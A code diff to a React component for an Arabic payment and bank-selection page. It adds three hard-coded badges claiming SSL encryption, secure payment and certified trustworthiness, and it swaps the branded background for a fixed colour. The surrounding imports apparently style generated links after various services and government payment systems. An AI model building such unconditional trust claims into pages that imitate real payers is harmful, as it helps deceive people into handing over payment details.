@@ -4,7 +4,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, ArrowLeft, Loader2, Shield, Lock, CheckCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
@@ -167,13 +167,28 @@ const PaymentBankSelector = () => {
   
   return (
     <div 
-      className="min-h-screen py-4 sm:py-12 bg-background" 
+      className="min-h-screen py-4 sm:py-12" 
       dir="rtl"
       style={{
-        background: govSystem.colors.surface
+        background: '#f9fafb'
       }}
     >
       <div className="container mx-auto px-4 max-w-2xl">
+        {/* Security Badges */}
+        <div className="mb-6 flex items-center justify-center gap-4 flex-wrap">
+          <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+            <Shield className="w-4 h-4 text-green-600" />
+            <span className="text-sm text-gray-700">تشفير SSL</span>
+          </div>
+          <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+            <Lock className="w-4 h-4 text-green-600" />
+            <span className="text-sm text-gray-700">دفع آمن</span>
+          </div>
+          <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+            <CheckCircle className="w-4 h-4 text-green-600" />
+            <span className="text-sm text-gray-700">معتمد وموثوق</span>
+          </div>
+        </div>
         {/* Header */}
         <div className="mb-6">
           <button
